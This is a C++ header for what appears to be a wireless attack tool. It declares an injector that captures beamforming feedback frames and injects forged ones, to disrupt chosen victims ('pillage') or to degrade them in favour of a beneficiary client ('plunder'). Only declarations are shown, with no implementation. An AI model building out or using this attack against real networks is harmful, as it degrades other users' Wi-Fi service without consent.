#pragma once
#include <pcap.h>
#include "bfi.h"
#include "scanner.h"
#include "logger.h"
#include <string>
#include <vector>
#include <functional>
#include <atomic>
#include <cstdint>

enum class AttackMode {
    PILLAGE,  // Disrupt victims only
    PLUNDER   // Degrade victims, boost quartermaster
};

// Per-victim timing sample
struct InjectSample {
    std::string victim_mac;
    double compute_ms = 0.0;
    bool   success    = false;
};

// Live statistics updated by the injection loop
struct AttackStats {
    std::atomic<int>    total_broadsides{0};
    std::atomic<int>    success_count{0};
    std::atomic<int>    fail_count{0};
    // Rolling average compute times per victim (updated externally)
    // keyed by victim MAC
};

// Callback invoked after each broadside with fresh timing samples.
// Used by the display module to update the live view.
using StatsCallback = std::function<void(const std::vector<InjectSample>&)>;

class Injector {
public:
    Injector(const std::string& iface,
             const APInfo& ap,
             Logger& logger);
    ~Injector();

    // Run the pillage attack loop until stop() is called.
    // victims: list of MAC addresses to target
    void run_pillage(const std::vector<ClientInfo>& victims,
                     const BFIParams& params,
                     StatsCallback cb);

    // Run the plunder attack loop until stop() is called.
    // victims: marks to degrade
    // quartermaster: beneficiary client whose BFI is also captured
    void run_plunder(const std::vector<ClientInfo>& victims,
                     const ClientInfo& quartermaster,
                     const BFIParams& params,
                     StatsCallback cb);

    // Signal the attack loop to stop cleanly
    void stop();

    AttackStats& stats() { return stats_; }

private:
    std::string iface_;
    APInfo      ap_;
    Logger&     logger_;
    AttackStats stats_;
    std::atomic<bool> running_{false};

    pcap_t* sniff_handle_ = nullptr;
    pcap_t* send_handle_  = nullptr;

    bool open_handles(char* errbuf);
    void close_handles();

    // Build and inject a forged BFI frame based on a captured genuine frame.
    // genuine_pkt: raw captured packet bytes
    // genuine_len: packet length
    // forged_feedback: replacement feedback bytes
    // feedback_len: length of forged_feedback
    // Returns true if pcap_inject succeeded
    bool inject_forged(const uint8_t* genuine_pkt,
                       int genuine_len,
                       const uint8_t* forged_feedback,
                       int feedback_len,
                       int feedback_offset_in_frame);

    // BPF filter string for capturing BFI frames from given MACs
    static std::string build_bpf(const std::vector<ClientInfo>& targets,
                                  const ClientInfo* quartermaster);

    // Locate the feedback matrix byte offset within a captured frame body
    static int feedback_offset(BFIStandard std);
};
